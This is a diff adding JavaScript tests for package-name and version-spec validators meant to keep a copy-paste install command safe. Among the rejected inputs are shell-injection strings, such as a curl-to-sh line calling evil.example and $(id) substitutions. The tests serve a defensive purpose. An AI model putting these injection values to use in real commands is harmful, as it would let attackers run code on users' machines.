@@ -139,3 +139,32 @@ test("build lab verdicts never call a wheel without an extension module a workin
   assert.equal(v({ outcome: "failed", reason: "unsupported platform" }).kind, "unsupported");  // uvloop on Windows: not a failure
   assert.equal(v({ outcome: "timeout", seconds: 2400 }).text, "didn't finish building in 40 min");
 });
+
+test("isPackageName accepts PEP 508 names (#57)", () => {
+  for (const name of ["numpy", "zope.interface", "A_b-c", "x", "Pillow", "backports.zoneinfo", "a1"]) {
+    assert.equal(logic.isPackageName(name), true, name);
+  }
+});
+
+test("isPackageName refuses anything that could change the copy-paste command (#57)", () => {
+  for (const name of ["", "foo; curl https://evil.example/x | sh #", "foo bar", "foo|sh", "foo`id`", "$(id)", "foo$(id)",
+    "-rf", "foo-", ".foo", "foo&&id", "foo>out", "foo\nbar", "foo\n", null, undefined, 3]) {
+    assert.equal(logic.isPackageName(name), false, JSON.stringify(name));
+  }
+});
+
+test("isPackageSpec takes a name or name==version, and nothing that could change the command (#57)", () => {
+  for (const spec of ["numpy", "numpy==2.0.0", "Django==5.1.3", "torch==2.5.1+cpu", "foo==1.0.post1", "foo==1.0rc1"]) {
+    assert.equal(logic.isPackageSpec(spec), true, spec);
+  }
+  for (const spec of ["", "numpy==", "==1.0", "numpy==1.0==2", "numpy>=1.0", "numpy==1.0; curl x | sh", "numpy==$(id)",
+    "numpy==1.0 -t all", "numpy==1!2.0", "foo; curl https://evil.example/x | sh #", null, undefined]) {
+    assert.equal(logic.isPackageSpec(spec), false, JSON.stringify(spec));
+  }
+});
+
+test("splitSpec looks a pinned query up by its name (#57)", () => {
+  assert.deepEqual(logic.splitSpec("numpy==2.0.0"), ["numpy", "2.0.0"]);
+  assert.deepEqual(logic.splitSpec(" numpy "), ["numpy", null]);
+  assert.deepEqual(logic.splitSpec("Django==5.1.3"), ["Django", "5.1.3"]);
+});
